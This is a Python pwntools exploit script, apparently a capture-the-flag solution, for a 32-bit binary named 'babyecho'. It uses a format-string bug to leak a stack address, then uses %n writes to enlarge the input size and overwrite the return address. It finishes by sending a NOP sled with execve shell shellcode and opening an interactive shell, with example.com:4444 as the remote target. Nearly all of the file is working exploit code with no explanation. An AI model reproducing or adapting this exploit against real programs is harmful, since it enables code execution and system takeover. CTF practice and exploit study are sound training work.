#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep

context.terminal = ['terminator','-e']
context.log_level = "debug"

chall = "./babyecho"
#libc = ELF()
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("example.com", 4444)
elif len(argv) >= 2 and argv[1] == "d":
    # printf
    # main ret
	cmd = """
		b *0x804900f
        b *0x804904e
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)


log.info("leak stack address")
payload = "%{}$p".format(5).encode()
p.recvuntil("bytes")
p.sendline(payload)
p.recvline()
leak = eval(p.recv(10))
log.info("leak: 0x{:08x}".format(leak))
input_size_addr = leak - 0xc
log.info("input_size_addr: 0x{:08x}".format(input_size_addr))

log.info("overwrite input size")
payload = p32(input_size_addr+1)
payload += "%{}c%{}$n".format(99, 7).encode()
p.recvuntil("bytes")
p.sendline(payload)

log.info("overwrite return address")
ret_addr = leak + 0x410
log.info("return address: 0x{:08x}".format(ret_addr))
buf_addr = leak
log.info("buffer start address: 0x{:08x}".format(buf_addr))
jump_addr = buf_addr + 0x40
log.info("jump address: 0x{:08x}".format(jump_addr))
payload = p32(ret_addr)
payload += p32(ret_addr+2)
payload += "%{}x%{}$hn".format(
        int(hex((jump_addr >>16) & 0xffff), 16)-0x4*2, 8).encode()
payload += "%{}x%{}$hn".format(
        int(hex(jump_addr & 0xffff).replace('0x', '0x1'), 16)-int(hex((jump_addr >>16) & 0xffff), 16), 7).encode()
p.recvuntil("bytes")
p.sendline(payload)

log.info("exec shellcode")
cmp_addr = leak - 0x4
log.info("cmp address: 0x{:08x}".format(cmp_addr))
shellcode = asm(shellcraft.sh())
payload = p32(cmp_addr)
payload += "%{}c%{}$n".format(int(0xcafe) - len(payload), 7).encode()
payload += p8(0x90) * 0x80
payload += shellcode
p.recvuntil("bytes")
p.sendline(payload)

p.interactive()
